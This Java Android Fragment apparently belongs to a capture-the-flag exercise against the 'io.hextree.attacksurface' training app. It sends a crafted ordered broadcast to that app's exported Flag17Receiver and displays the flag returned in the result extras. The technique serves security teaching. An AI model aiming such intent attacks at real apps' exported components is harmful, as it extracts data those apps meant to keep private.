package com.appdev.intentattacks;

import static android.app.Activity.RESULT_CANCELED;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.fragment.app.Fragment;

public class Flag17Fragment extends Fragment {
    private static final String CUSTOM_ACTION = "com.appdev.intentattacks.CUSTOM_ACTION";
    private BroadcastReceiver flagReceiver;

    @RequiresApi(api = Build.VERSION_CODES.TIRAMISU)
    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_flag17, container, false);
        Button launchButton = view.findViewById(R.id.btnLaunchFlag17);

        launchButton.setOnClickListener(v -> {
            Intent intent = new Intent(CUSTOM_ACTION);
            intent.putExtra("flag", "give-flag-17");
            intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag17Receiver"));
            getContext().sendOrderedBroadcast(intent, null, new BroadcastReceiver() {
                @Override
                public void onReceive(Context context, Intent intent) {
                    Bundle resultExtras = getResultExtras(false);
                    String resultData = getResultData();
                    int resultCode = getResultCode();
                    String flag = resultExtras.getString("flag");
                    Toast.makeText(getContext(), "Flag: " + flag, Toast.LENGTH_LONG).show();
                }
            }, null, RESULT_CANCELED, null, null);

        });

        return view;
    }
}